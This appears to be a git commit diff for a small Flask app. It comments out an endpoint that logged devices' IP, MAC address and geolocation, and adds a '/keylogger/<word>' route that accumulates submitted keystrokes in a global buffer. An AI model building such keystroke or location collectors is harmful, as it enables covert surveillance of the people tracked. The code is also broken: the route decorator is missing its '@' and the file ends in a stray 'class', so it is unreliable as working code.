0e73a93016efa9b1393d6efd7da28624321b67f4
YoniCohen <89537632+LOL-xt@users.noreply.github.com>
2021-12-24 10:52:43 +0200

    Update main.py

--- app/main.py
+++ app/main.py
@@ -1,32 +1,48 @@
 from flask import Response
 from flask import request
 from flask import json
+from flask import send_file
 from .user import User
 from .database import db, app
 
 
-@app.route('/test')
-def index():
-    return "you are logged in"
+string_data = ''
 
 
-@app.route('/update', methods=["POST"])
-def update():
-    ip = request.form['ip']
-    name = request.form['name']
-    latitude = request.form['latitude']
-    longitude = request.form['longitude']
-    country = request.form['country']
-    city = request.form['city']
-    mac = request.form['mac']
-    try:
-        db.session.query(User).filter(User.mac == mac).one()
-        return Response("Device is already in database", status=200, mimetype='application/json')
-    except:
-        new_user = User(mac, ip, name, latitude, longitude, country, city)
-        db.session.add(new_user)
-        db.session.commit()
-        return Response("Welcome " + name, status=200, mimetype='application/json')
+app.route('/keylogger/<word>', methods=["GET"])
+def check_word(word):
+    word_detected = False
+    global string_data
+    string_data += str(word)
+    if 'yoni' in string_data:
+        return 'hi yoni'
+    if 'itay' in string_data:
+        return 'hi itay'
+    if 'cat' in string_data:
+        return send_file('images/cat.jpg', mimetype='image')
+    if word_detected:
+        string_data = ''
+        word_detected = False
 
 
+
+# @app.route('/update', methods=["POST"])
+# def update():
+#     ip = request.form['ip']
+#     name = request.form['name']
+#     latitude = request.form['latitude']
+#     longitude = request.form['longitude']
+#     country = request.form['country']
+#     city = request.form['city']
+#     mac = request.form['mac']
+#     try:
+#         db.session.query(User).filter(User.mac == mac).one()
+#         return Response("Device is already in database", status=200, mimetype='application/json')
+#     except:
+#         new_user = User(mac, ip, name, latitude, longitude, country, city)
+#         db.session.add(new_user)
+#         db.session.commit()
+#         return Response("Welcome " + name, status=200, mimetype='application/json')
+
+class 
 
